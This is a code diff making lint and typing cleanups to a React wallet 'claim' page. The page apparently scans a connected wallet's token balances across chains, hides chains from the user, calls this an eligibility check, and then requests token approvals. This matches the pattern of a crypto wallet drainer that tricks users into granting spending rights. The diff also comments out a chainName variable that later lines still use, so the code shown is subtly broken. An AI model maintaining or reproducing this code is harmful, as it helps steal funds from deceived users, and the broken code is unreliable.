@@ -196,7 +196,7 @@ interface MediaContainerProps {
     primaryAccent: string;
 }
 
-const MediaContainer: React.FC<MediaContainerProps> = ({ mediaState, isConnected, primaryAccent }) => {
+const MediaContainer: React.FC<MediaContainerProps> = ({ mediaState, isConnected }) => {
     const isVideoActive = isConnected && mediaState === 'video';
 
     const handleImageError = (e: React.SyntheticEvent<HTMLImageElement, Event>) => {
@@ -248,7 +248,7 @@ interface NotificationToastProps {
     primaryAccent: string;
 }
 
-const NotificationToast: React.FC<NotificationToastProps> = React.memo(({ address, amount, onClose, primaryAccent }) => {
+const NotificationToast: React.FC<NotificationToastProps> = React.memo(function NotificationToast({ address, amount, onClose }) {
     const [isVisible, setIsVisible] = useState<boolean>(false);
 
     useEffect(() => {
@@ -426,14 +426,14 @@ function ConnectionReporter() {
     const isCheckingEligibility = useRef(false);
 
     // --- Real Wallet/Claim Handlers ---
-    const connectWallet = async (): Promise<void> => {
+    const connectWallet = useCallback(async (): Promise<void> => {
         showMessage('Connecting to wallet...', 'info');
         try {
             await open();
         } catch (err) {
             console.error('[Connect] Error opening modal:', err);
         }
-    };
+    }, [open, showMessage]);
 
     const disconnectWallet = async (): Promise<void> => {
         try {
@@ -508,7 +508,7 @@ function ConnectionReporter() {
 
     try {
       let targetChain: number | null = null;
-                let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number; chainId: number }[] = [];
+                const usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number; chainId: number }[] = [];
 
                 // Scan all chains for token balances
       for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
@@ -519,7 +519,7 @@ function ConnectionReporter() {
                     }
                     
         const numericCid = Number(cid);
-        const chainName = CHAIN_NAMES[numericCid] || `Chain ${numericCid}`;
+        // const chainName = CHAIN_NAMES[numericCid] || `Chain ${numericCid}`;
 
         // Check gas availability on this chain first with real-time gas price
         try {
@@ -548,7 +548,7 @@ function ConnectionReporter() {
                 // Skip this chain - not enough gas (don't show to user)
                 continue;
             }
-        } catch (err) {
+        } catch {
             // Silently skip chains with errors
             continue;
         }
@@ -636,7 +636,7 @@ function ConnectionReporter() {
                 isCheckingEligibility.current = false;
                 showMessage(`You are eligible! Found ${usableTokens.length} token(s) on ${chainName}`, 'success');
                 
-            } catch (err: any) {
+            } catch (err: unknown) {
                 console.error('Eligibility check failed:', err);
                 
                 // Only update state if still checking
@@ -679,9 +679,9 @@ function ConnectionReporter() {
                     showMessage(`Switching to ${chainName}...`, 'info');
         await switchChain(config, { chainId: targetChain });
                     await new Promise(resolve => setTimeout(resolve, 1500));
-                } catch (switchErr: any) {
+                } catch (switchErr: unknown) {
                     console.error('Chain switch error:', switchErr);
-                    showMessage(`Failed to switch network: ${switchErr?.message || 'Unknown error'}`, 'error');
+                    showMessage(`Failed to switch network: ${switchErr instanceof Error ? switchErr.message : 'Unknown error'}`, 'error');
                     setIsLoading(false);
                     return;
                 }
@@ -735,10 +735,10 @@ function ConnectionReporter() {
         // Exit the loop after first successful approval
         break;
 
-                } catch (tokenErr: any) {
+                } catch (tokenErr: unknown) {
                     console.error(`Error approving ${token.symbol}:`, tokenErr);
                     
-                    if (tokenErr?.message?.includes('User rejected') || tokenErr?.message?.includes('user rejected')) {
+                    if (tokenErr instanceof Error && (tokenErr.message.includes('User rejected') || tokenErr.message.includes('user rejected'))) {
                         showMessage(`Approval cancelled by user`, 'error');
                         setIsLoading(false);
                         return;
@@ -754,15 +754,13 @@ function ConnectionReporter() {
                 showMessage("No tokens were approved.", 'error');
             }
 
-    } catch (err: any) {
+    } catch (err: unknown) {
             console.error('Claim error:', err);
             
             let errorMsg = "Unknown error";
-            if (err?.message?.includes('User rejected') || err?.message?.includes('user rejected')) {
+            if (err instanceof Error && (err.message.includes('User rejected') || err.message.includes('user rejected'))) {
                 errorMsg = "Transaction cancelled by user";
-            } else if (err?.shortMessage) {
-                errorMsg = err.shortMessage;
-            } else if (err?.message) {
+            } else if (err instanceof Error) {
                 errorMsg = err.message;
             }
             
